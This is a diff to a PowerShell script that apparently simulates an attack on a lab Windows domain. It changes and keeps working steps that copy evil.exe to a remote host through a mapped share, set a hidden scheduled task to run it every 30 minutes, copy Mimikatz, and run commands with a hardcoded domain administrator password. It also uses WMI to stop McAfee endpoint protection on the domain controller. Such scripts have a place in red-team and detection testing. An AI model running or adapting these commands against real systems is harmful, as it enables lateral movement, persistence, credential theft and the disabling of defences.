@@ -40,7 +40,7 @@ Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c c:\exploit\p
 net use z: \\defender-win10\exploit
 xcopy c:\exploit\evil.exe z:\ /E /y
 dir z:\
-Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c schtasks /create /sc minute /mo 360 /tn eviltask /tr c:\exploit\evil.exe /ru danny /s defender-win10" -WindowStyle Hidden -WorkingDirectory "C:\Windows\system32"
+Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c schtasks /create /sc minute /mo 30 /tn eviltask /tr c:\exploit\evil.exe /ru danny /s defender-win10" -WindowStyle Hidden -WorkingDirectory "C:\Windows\system32"
 
 "Copy Mimikatz"
 xcopy c:\exploit\mimikatz\ z:\mimikatz\ /E /y
@@ -55,8 +55,8 @@ $password = 'Cadmin!'
 $user = "sec.content\Administrator"
 $securepassword= ConvertTo-SecureString -String $password -AsPlainText -Force
 $admincred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user, $securepassword
-Start-Process -FilePath cmd.exe -Credential $admincred -ArgumentList "/c whoami /group" -WindowStyle Hidden -WorkingDirectory "C:\Windows\system32"
-
+Start-Process -FilePath cmd.exe -Credential $admincred -ArgumentList "/c whoami /groups > c:\exploit\admin_group.txt" -WindowStyle Hidden -WorkingDirectory "C:\Windows\system32"
+get-content c:\exploit\admin_group.txt
 "WMI Execution To DC"
 Start-Process -FilePath cmd.exe -Credential $admincred -ArgumentList "/c wmic /node:dcontent service where `"name='McAfee Endpoint Security Threat Prevention'`" call stopservice /nointeractive " -WindowStyle Hidden -WorkingDirectory "C:\Windows\system32"
 
